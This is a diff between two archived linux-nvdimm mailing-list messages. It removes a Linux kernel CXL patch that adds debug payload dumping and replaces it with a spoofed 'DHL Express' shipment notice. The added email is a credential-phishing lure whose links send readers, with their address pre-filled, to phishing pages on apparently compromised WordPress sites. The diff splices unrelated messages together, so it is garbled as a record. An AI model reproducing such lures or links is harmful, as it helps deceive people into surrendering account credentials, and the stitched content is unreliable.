@@ -1,118 +1,95 @@
 Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
-Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id E857931D46B
-	for <lists+linux-nvdimm@lfdr.de>; Wed, 17 Feb 2021 05:10:25 +0100 (CET)
+Received: from ml01.01.org (ml01.01.org [198.145.21.10])
+	by mail.lfdr.de (Postfix) with ESMTPS id A1FA831D501
+	for <lists+linux-nvdimm@lfdr.de>; Wed, 17 Feb 2021 06:29:32 +0100 (CET)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id 10146100EAB7B;
-	Tue, 16 Feb 2021 20:10:22 -0800 (PST)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=134.134.136.20; helo=mga02.intel.com; envelope-from=ben.widawsky@intel.com; receiver=<UNKNOWN> 
-Received: from mga02.intel.com (mga02.intel.com [134.134.136.20])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id 97E3B100EAB72
-	for <linux-nvdimm@lists.01.org>; Tue, 16 Feb 2021 20:10:18 -0800 (PST)
-IronPort-SDR: //Ko6DuuYjQ4aU9jIv288Xoe9iywFhqXZ+DVYmza9N1y48h3u1pyxRoJos/j4ALGAm7XDKRNF5
- 4crY0mC3WfMw==
-X-IronPort-AV: E=McAfee;i="6000,8403,9897"; a="170229454"
-X-IronPort-AV: E=Sophos;i="5.81,184,1610438400";
-   d="scan'208";a="170229454"
-Received: from fmsmga008.fm.intel.com ([10.253.24.58])
-  by orsmga101.jf.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 16 Feb 2021 20:10:18 -0800
-IronPort-SDR: Mug5PkrodM8Rl1xWiYxq98sDIf0X3SSeMjlZa9yQ7TA5gumGj0U/nmFtBL6W2PpAlt1kXP8boS
- FlOqJ5QddABA==
-X-IronPort-AV: E=Sophos;i="5.81,184,1610438400";
-   d="scan'208";a="384948885"
-Received: from yxie-mobl.amr.corp.intel.com (HELO bwidawsk-mobl5.local) ([10.252.134.141])
-  by fmsmga008-auth.fm.intel.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 16 Feb 2021 20:10:16 -0800
-From: Ben Widawsky <ben.widawsky@intel.com>
-To: linux-cxl@vger.kernel.org
-Subject: [RFC PATCH v5 9/9] cxl/mem: Add payload dumping for debug
-Date: Tue, 16 Feb 2021 20:09:58 -0800
-Message-Id: <20210217040958.1354670-10-ben.widawsky@intel.com>
-X-Mailer: git-send-email 2.30.1
-In-Reply-To: <20210217040958.1354670-1-ben.widawsky@intel.com>
-References: <20210217040958.1354670-1-ben.widawsky@intel.com>
+	by ml01.01.org (Postfix) with ESMTP id 9C4B7100EAB6A;
+	Tue, 16 Feb 2021 21:29:30 -0800 (PST)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=78.157.214.119; helo=sina.tums.ac.ir; envelope-from=msharifzadeh@sina.tums.ac.ir; receiver=<UNKNOWN> 
+Received: from sina.tums.ac.ir (unknown [78.157.214.119])
+	by ml01.01.org (Postfix) with ESMTP id 05889100EAB68
+	for <linux-nvdimm@lists.01.org>; Tue, 16 Feb 2021 21:29:26 -0800 (PST)
+From: DHL_Express <msharifzadeh@sina.tums.ac.ir>
+To: linux-nvdimm@lists.01.org
+Subject: Shipment Arrival Notice.
+Date: 17 Feb 2021 06:29:24 +0100
+Message-ID: <20210217062924.B00B436F8E1BF1CD@sina.tums.ac.ir>
 MIME-Version: 1.0
-Message-ID-Hash: XYLXSSCEKESR5F6SJCPPHHDPZWPIZBU3
-X-Message-ID-Hash: XYLXSSCEKESR5F6SJCPPHHDPZWPIZBU3
-X-MailFrom: ben.widawsky@intel.com
+Message-ID-Hash: FIZGDAKVAAQ5ANXX3PQVCQE5OYQBGRVG
+X-Message-ID-Hash: FIZGDAKVAAQ5ANXX3PQVCQE5OYQBGRVG
+X-MailFrom: msharifzadeh@sina.tums.ac.ir
 X-Mailman-Rule-Hits: nonmember-moderation
 X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
-CC: Ben Widawsky <ben.widawsky@intel.com>, linux-acpi@vger.kernel.org, linux-kernel@vger.kernel.org, linux-nvdimm@lists.01.org, linux-pci@vger.kernel.org, Bjorn Helgaas <helgaas@kernel.org>, Chris Browy <cbrowy@avery-design.com>, Christoph Hellwig <hch@infradead.org>, David Hildenbrand <david@redhat.com>, David Rientjes <rientjes@google.com>, Jon Masters <jcm@jonmasters.org>, Jonathan Cameron <Jonathan.Cameron@Huawei.com>, Rafael Wysocki <rafael.j.wysocki@intel.com>, Randy Dunlap <rdunlap@infradead.org>, "John Groves (jgroves)" <jgroves@micron.com>, "Kelley, Sean V" <sean.v.kelley@intel.com>
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/XYLXSSCEKESR5F6SJCPPHHDPZWPIZBU3/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/FIZGDAKVAAQ5ANXX3PQVCQE5OYQBGRVG/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============7808440413442786887=="
+
+--===============7808440413442786887==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p>
+
+</p><div>Notification of shipment for <br></div><p>linux-nvdimm@lists.01.or=
+g; <br></p><div><div><div><div><div>&nbsp; <br><br>Dear Customer,<br><br>Th=
+is is to notify you that you have an incoming shipment registered in=20
+your email linux-nvdimm@lists.01.org. <br>Please follow the URL below to tr=
+ack your=20
+shipment.=20
+
+<br><br><a href=3D"https://www.studioraster.hr/wp-content/plugins/password/=
+dhl/source/index.php?email=3Dlinux-nvdimm@lists.01.org" target=3D"_blank" d=
+ata-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://joshidentalcl=
+inicjaipur.com/wp-admin/newwwww/dhl/source/index.php?email%3D%5B%5B-Email-%=
+5D%5D&amp;source=3Dgmail&amp;ust=3D1613544552188000&amp;usg=3DAFQjCNEnaufL9=
+jtUQcIZYk-nYt2y2ULu1Q">gulliver.ma/update/dhl/source/<wbr>index.php?email=
+=3Dlinux-nvdimm@lists.01.org</a></div><div><br></div><div>
+Please feel free to contact me in case of any further assistance.<br>We tha=
+nk you for choosing DHL Express.<br><br>&nbsp; <br><br>Thanks and regards,<=
+br>Customer Service Agent<br>DHL Express<br>GOGREEN &#8211; Environmental P=
+rotection with DHL<br><br><br>------------------------------<wbr>----------=
+--------------------<wbr>-----<br>------------------------------<wbr>------=
+--<br>CONFIDENTIALITY NOTICE: This message is from DHL and may contain <br>=
+confidential business information.<br>
+It is intended solely for the use of the individual to whom it is <br>addre=
+ssed. If you are not the <br>intended recipient please contact the sender a=
+nd delete this <br>message and any attachment from your<br>&nbsp;system. Un=
+authorized publication, use, dissemination, <br>forwarding, printing or cop=
+ying of this E-Mail<br>&nbsp;and its attachments is strictly prohibited.<br=
+>------------------------------<wbr>------------------------------<wbr>----=
+-<br>------------------------------<wbr>
+--------</div>
+
+
+
+</div></div></div></div><p>
+</p>
+
+
+</body></html>
+--===============7808440413442786887==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-It's often useful in debug scenarios to see what the hardware has dumped
-out. As it stands today, any device error will result in the payload not
-being copied out, so there is no way to triage commands which weren't
-expected to fail (and sometimes the payload may have that information).
-
-The functionality is protected by normal kernel security mechanisms as
-well as a CONFIG option in the CXL driver.
-
-This was extracted from the original version of the CXL enabling patch
-series.
-
-Signed-off-by: Ben Widawsky <ben.widawsky@intel.com>
----
- drivers/cxl/Kconfig | 13 +++++++++++++
- drivers/cxl/mem.c   |  8 ++++++++
- 2 files changed, 21 insertions(+)
-
-diff --git a/drivers/cxl/Kconfig b/drivers/cxl/Kconfig
-index 97dc4d751651..3eec9276e586 100644
---- a/drivers/cxl/Kconfig
-+++ b/drivers/cxl/Kconfig
-@@ -50,4 +50,17 @@ config CXL_MEM_RAW_COMMANDS
- 	  potential impact to memory currently in use by the kernel.
- 
- 	  If developing CXL hardware or the driver say Y, otherwise say N.
-+
-+config CXL_MEM_INSECURE_DEBUG
-+	bool "CXL.mem debugging"
-+	depends on CXL_MEM
-+	help
-+	  Enable debug of all CXL command payloads.
-+
-+	  Some CXL devices and controllers support encryption and other
-+	  security features. The payloads for the commands that enable
-+	  those features may contain sensitive clear-text security
-+	  material. Disable debug of those command payloads by default.
-+	  If you are a kernel developer actively working on CXL
-+	  security enabling say Y, otherwise say N.
- endif
-diff --git a/drivers/cxl/mem.c b/drivers/cxl/mem.c
-index 6d7d3870b5da..d63c8eaf23c7 100644
---- a/drivers/cxl/mem.c
-+++ b/drivers/cxl/mem.c
-@@ -346,6 +346,14 @@ static int __cxl_mem_mbox_send_cmd(struct cxl_mem *cxlm,
- 
- 	/* #5 */
- 	rc = cxl_mem_wait_for_doorbell(cxlm);
-+
-+	if (!cxl_is_security_command(mbox_cmd->opcode) ||
-+	    IS_ENABLED(CONFIG_CXL_MEM_INSECURE_DEBUG)) {
-+		print_hex_dump_debug("Payload ", DUMP_PREFIX_OFFSET, 16, 1,
-+				     mbox_cmd->payload_in, mbox_cmd->size_in,
-+				     true);
-+	}
-+
- 	if (rc == -ETIMEDOUT) {
- 		cxl_mem_mbox_timeout(cxlm, mbox_cmd);
- 		return rc;
--- 
-2.30.1
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
 To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
+
+--===============7808440413442786887==--
